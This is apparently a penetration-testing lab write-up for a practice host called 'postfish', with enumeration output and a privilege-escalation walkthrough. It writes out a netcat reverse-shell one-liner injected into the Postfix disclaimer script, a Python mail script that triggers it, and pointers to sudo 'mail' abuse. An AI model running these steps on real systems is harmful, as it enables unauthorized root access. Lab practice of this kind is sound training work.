drwxr-xr-x   6 root root       4096 Jan  7  2021 snap
drwxr-xr-x   2 root root       4096 Jul 31  2020 srv
-rw-------   1 root root 2042626048 Jan  7  2021 swap.img
dr-xr-xr-x  13 root root          0 Aug  3  2024 sys
drwxrwxrwt  18 root root       4096 Mar  6 23:20 tmp
drwxr-xr-x  14 root root       4096 Jul 31  2020 usr
drwxr-xr-x  14 root root       4096 Jan 26  2021 var

```

4. SUID / SGID / Capabilities

```
brian.moore@postfish:~$ find / -perm -4000 -type f 2>/dev/null
/snap/snapd/11402/usr/lib/snapd/snap-confine
/snap/snapd/10707/usr/lib/snapd/snap-confine
/snap/core18/1988/bin/mount
/snap/core18/1988/bin/ping
/snap/core18/1988/bin/su
/snap/core18/1988/bin/umount
/snap/core18/1988/usr/bin/chfn
/snap/core18/1988/usr/bin/chsh
/snap/core18/1988/usr/bin/gpasswd
/snap/core18/1988/usr/bin/newgrp
/snap/core18/1988/usr/bin/passwd
/snap/core18/1988/usr/bin/sudo
/snap/core18/1988/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1988/usr/lib/openssh/ssh-keysign
/snap/core18/1997/bin/mount
/snap/core18/1997/bin/ping
/snap/core18/1997/bin/su
/snap/core18/1997/bin/umount
/snap/core18/1997/usr/bin/chfn
/snap/core18/1997/usr/bin/chsh
/snap/core18/1997/usr/bin/gpasswd
/snap/core18/1997/usr/bin/newgrp
/snap/core18/1997/usr/bin/passwd
/snap/core18/1997/usr/bin/sudo
/snap/core18/1997/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1997/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/bin/chfn
/usr/bin/umount
/usr/bin/mount
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/chsh
brian.moore@postf

brian.moore@postfish:~$ find / -perm -2000 -type f 2>/dev/null
/snap/core18/1988/sbin/pam_extrausers_chkpwd
/snap/core18/1988/sbin/unix_chkpwd
/snap/core18/1988/usr/bin/chage
/snap/core18/1988/usr/bin/expiry
/snap/core18/1988/usr/bin/ssh-agent
/snap/core18/1988/usr/bin/wall
/snap/core18/1997/sbin/pam_extrausers_chkpwd
/snap/core18/1997/sbin/unix_chkpwd
/snap/core18/1997/usr/bin/chage
/snap/core18/1997/usr/bin/expiry
/snap/core18/1997/usr/bin/ssh-agent
/snap/core18/1997/usr/bin/wall
/usr/sbin/unix_chkpwd
/usr/sbin/pam_extrausers_chkpwd
/usr/sbin/postqueue
/usr/sbin/postdrop
/usr/lib/x86_64-linux-gnu/utempter/utempter
/usr/bin/ssh-agent
/usr/bin/crontab
/usr/bin/chage
/usr/bin/dotlock.mailutils
/usr/bin/at
/usr/bin/expiry
/usr/bin/bsd-write

brian.moore@postfish:~$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep


```

5. Cron & Scheduled Tasks

```
brian.moore@postfish:~$ cat /etc/crontab 2>/dev/null
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

brian.moore@postfish:~$ ls -la /etc/cron.* 2>/dev/null
/etc/cron.d:
total 20
drwxr-xr-x   2 root root 4096 Mar  6 21:39 .
drwxr-xr-x 100 root root 4096 Mar  6 21:45 ..
-rw-r--r--   1 root root  201 Feb 14  2020 e2scrub_all
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rw-r--r--   1 root root  190 Jul 31  2020 popularity-contest

/etc/cron.daily:
total 52
drwxr-xr-x   2 root root 4096 Mar  6 21:44 .
drwxr-xr-x 100 root root 4096 Mar  6 21:45 ..
-rwxr-xr-x   1 root root  539 Apr 13  2020 apache2
-rwxr-xr-x   1 root root  376 Dec  4  2019 apport
-rwxr-xr-x   1 root root 1478 Apr  9  2020 apt-compat
-rwxr-xr-x   1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x   1 root root 1187 Sep  5  2019 dpkg
-rwxr-xr-x   1 root root  377 Jan 21  2019 logrotate
-rwxr-xr-x   1 root root 1123 Feb 25  2020 man-db
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x   1 root root 4574 Jul 18  2019 popularity-contest
-rwxr-xr-x   1 root root  214 Apr  2  2020 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x   2 root root 4096 Jul 31  2020 .
drwxr-xr-x 100 root root 4096 Mar  6 21:45 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x   2 root root 4096 Jul 31  2020 .
drwxr-xr-x 100 root root 4096 Mar  6 21:45 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x   2 root root 4096 Jan 26  2021 .
drwxr-xr-x 100 root root 4096 Mar  6 21:45 ..
-rwxr-xr-x   1 root root  813 Feb 25  2020 man-db
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x   1 root root  211 Apr  2  2020 update-notifier-common

crontab -l 2>/dev/null
```

6. Processes & Network

```
ps aux

ps -ef

brian.moore@postfish:~$ ss -tulwn 2>/dev/null
Netid      State       Recv-Q      Send-Q           Local Address:Port           Peer Address:Port     Process      
udp        UNCONN      0           0                127.0.0.53%lo:53                  0.0.0.0:*                     
tcp        LISTEN      0           100                    0.0.0.0:993                 0.0.0.0:*                     
tcp        LISTEN      0           100                    0.0.0.0:995                 0.0.0.0:*                     
tcp        LISTEN      0           100                    0.0.0.0:110                 0.0.0.0:*                     
tcp        LISTEN      0           100                    0.0.0.0:143                 0.0.0.0:*                     
tcp        LISTEN      0           511                    0.0.0.0:80                  0.0.0.0:*                     
tcp        LISTEN      0           4096             127.0.0.53%lo:53                  0.0.0.0:*                     
tcp        LISTEN      0           128                    0.0.0.0:22                  0.0.0.0:*                     
tcp        LISTEN      0           100                    0.0.0.0:25                  0.0.0.0:*    

netstat -tulnp 2>/dev/null
```

7.  Software / Packages

```
dpkg -l 2>/dev/null | head -n 200

rpm -qa 2>/dev/null | head -n 200
```

8. Loot Files & Credentials

```
brian.moore@postfish:~$ ls -la /var/www 2>/dev/null
total 16
drwxr-xr-x  4 root     root     4096 Jan 26  2021 .
drwxr-xr-x 14 root     root     4096 Jan 26  2021 ..
drwxr-xr-x  2 www-data www-data 4096 Mar 24  2021 bait
drwxr-xr-x  2 www-data www-data 4096 Jan 26  2021 html

brian.moore@postfish:~$ grep -R "password\|db\|user" /var/www 2>/dev/null | head -n 50
Binary file /var/www/bait/4.png matches
Binary file /var/www/bait/2.png matches
Binary file /var/www/bait/3.png matches

brian.moore@postfish:~$ find /home -type f -name "*.txt" 2>/dev/null
/home/brian.moore/local.txt

brian.moore@postfish:~$ find /home -type f -name "*history*" 2>/dev/null

brian.moore@postfish:~$ find /home -type f \( -name "id_rsa" -o -name "id_*" \) 2>/dev/null

brian.moore@postfish:~$ grep -Ri "password\|passwd\|secret\|token\|key" /home 2>/dev/null | head -n 50
brian.moore@postfish:~$ find / -name "*.bak" -o -name "*~" 2>/dev/null | head -n 50

```

9.  Containers / Virtualization

```
brian.moore@postfish:~$ ls -la /.dockerenv 2>/dev/null

brian.moore@postfish:~$ grep -i docker /proc/1/cgroup 2>/dev/null

```

10. Automated Enumeration 

```
uid=1000(brian.moore) gid=1000(brian.moore) groups=1000(brian.moore),8(mail),997(filter)

uid=104(syslog) gid=110(syslog) groups=110(syslog),4(adm),5(tty)

Ubuntu 20.04.1 LTS

1.8.31 

Vulnerable to CVE-2021-3560

[/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep](https://www.exploit-db.com/exploits/411)

/home/brian.moore/.bash_history



```

11. Possible PE Paths

```
https://www.exploit-db.com/exploits/34896
https://www.exploit-db.com/exploits/6337
https://www.exploit-db.com/exploits/411

uid=1000(brian.moore) gid=1000(brian.moore) groups=1000(brian.moore),8(mail),997(filter)
```

**Privilege Escalation**

1. PE Steps

- After research found that there is a privilege escalation vulnerability if you have access to the /etc/postfix/disclaimer. Which access to the filter group brian.moore as the following permissions. 

![[Pasted image 20260309125422.png]]

- Added the following  to the /etc/postfix/disclaimer file.

```
mkfifo /tmp/f; nc 192.168.45.215 443 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

![[Pasted image 20260309125553.png]]

- Since the disclaimer in assigned to it@postfish.off and brian.moore@postfish.off, I needed to send an email to brian or it. 

![[Pasted image 20260309125724.png]]

- Sent email using the below python script. 

```
#!/usr/bin/python3

import smtplib

sender = 'brian.moore@postfish.off'
receivers = ['brian.moore@postfish.off']

message = """From: From Brian <brian.moore@postfish.off>
To: To Brian <brian.moore@postfish.off>
Subject: Give me a reverse shell pls

Why? Because I asked nicely.
"""

try:
   smtpObj = smtplib.SMTP('localhost')
   smtpObj.sendmail(sender, receivers, message)         
except SMTPException:
   print("Error: unable to send email")

```

- Received reverse shell when disclaimer was added to e-mail. Did a sudo -l and saw I could run mail as sudo with filter account. Found escalation opportunity in gtfobin https://gtfobins.org/gtfobins/mail/.

![[Pasted image 20260309125909.png]]

2. Notes

```

```

